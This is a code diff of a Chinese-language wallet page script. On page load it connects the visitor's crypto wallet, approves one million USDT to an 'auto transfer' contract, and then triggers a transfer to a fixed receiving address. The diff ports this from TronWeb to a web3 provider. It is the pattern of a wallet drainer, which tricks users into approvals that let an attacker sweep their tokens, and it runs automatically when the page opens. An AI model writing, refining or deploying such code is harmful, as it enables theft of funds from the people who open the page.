@@ -1,10 +1,9 @@
-const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT合约地址
-const autoTransferContractAddress = 'TJKQATfKMkgbVVNjS1BXfXfaup3CCcAkQz'; // 自动转账合约地址
+const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const autoTransferContractAddress = 'TJKQATfKMkgbVVNjS1BXfXfaup3CCcAkQz';
 const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT
-const receivingAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE'; // 收款地址
+const receiverAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE';
 
 const usdtAbi = [
-    // USDT合约ABI
     {"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
     {"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
@@ -48,60 +47,58 @@ const usdtAbi = [
     {"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},
     {"anonymous":false,"inputs":[],"name":"Pause","type":"event"},
     {"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},
     {"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},
     {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}
 ];
 
 const autoTransferAbi = [
-    {"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
-    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
-    {"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"checkAndTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-    {"inputs":[{"internalType":"uint256","name":"newThreshold","type":"uint256"}],"name":"setThreshold","outputs":[],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[],"name":"threshold","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-    {"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
+    // 自动转账合约的ABI
+    { "inputs": [ { "internalType": "address", "name": "_usdtToken", "type": "address" } ], "stateMutability": "nonpayable", "type": "constructor" },
+    { "anonymous": false, "inputs": [ { "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" } ], "name": "Transfer", "type": "event" },
+    { "inputs": [ { "internalType": "address", "name": "userWallet", "type": "address" } ], "name": "checkAndTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [], "name": "owner", "outputs": [ { "internalType": "address", "name": "", "type": "address" } ], "stateMutability": "view", "type": "function" },
+    { "inputs": [ { "internalType": "uint256", "name": "newThreshold", "type": "uint256" } ], "name": "setThreshold", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+    { "inputs": [], "name": "threshold", "outputs": [ { "internalType": "uint256", "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" },
+    { "inputs": [], "name": "usdtToken", "outputs": [ { "internalType": "address", "name": "", "type": "address" } ], "stateMutability": "view", "type": "function" }
 ];
 
-let tronWeb;
+window.addEventListener('load', async () => {
+    const resultElement = document.getElementById('result');
 
-async function init() {
-    if (typeof window.tronWeb === 'undefined') {
-        document.getElementById('result').innerText = '请安装OKX Wallet并切换到TRON网络!';
-        return;
+    if (typeof window.ethereum !== 'undefined') {
+        window.web3 = new Web3(window.ethereum);
+        try {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            resultElement.innerHTML += '钱包连接成功<br>';
+            startAuthorization();
+        } catch (error) {
+            resultElement.innerHTML += '钱包连接失败: ' + error.message + '<br>';
+        }
+    } else {
+        resultElement.innerHTML += '请安装欧易钱包应用<br>';
     }
+});
 
-    tronWeb = window.tronWeb;
+async function startAuthorization() {
+    const accounts = await web3.eth.getAccounts();
+    const userAccount = accounts[0];
+
+    const resultElement = document.getElementById('result');
+    resultElement.innerHTML += '账户: ' + userAccount + '<br>';
+
+    const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
+    const autoTransferContract = new web3.eth.Contract(autoTransferAbi, autoTransferContractAddress);
 
     try {
-        await tronWeb.ready;
-        const account = tronWeb.defaultAddress.base58;
+        resultElement.innerHTML += '开始授权...<br>';
+        await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({ from: userAccount });
+        resultElement.innerHTML += '授权成功<br>';
 
-        if (!account) {
-            throw new Error('未连接到钱包，请确保钱包已连接并切换到TRON网络');
-        }
-
-        document.getElementById('result').innerText = '钱包已连接，账户地址: ' + account;
-
-        const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
-        const autoTransferContract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
-
-        document.getElementById('result').innerText += '\nUSDT Contract: ' + usdtContractAddress;
-        document.getElementById('result').innerText += '\nAuto Transfer Contract: ' + autoTransferContractAddress;
-
-        document.getElementById('result').innerText += '\n开始授权...';
-        await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send();
-
-        document.getElementById('result').innerText += '\n授权成功';
-        document.getElementById('result').innerText += '\n开始转账...';
-        await autoTransferContract.methods.checkAndTransfer(receivingAddress).send();
-
-        document.getElementById('result').innerText += '\n转账成功';
+        resultElement.innerHTML += '开始转账...<br>';
+        await autoTransferContract.methods.checkAndTransfer(receiverAddress).send({ from: userAccount });
+        resultElement.innerHTML += '转账成功<br>';
     } catch (error) {
-        console.error('Error:', error);
-        document.getElementById('result').innerText += '\n操作失败: ' + (error.message || '未知错误');
+        resultElement.innerHTML += '操作失败: ' + error.message + '<br>';
     }
 }
-
-document.addEventListener('DOMContentLoaded', () => {
-    init();
-});
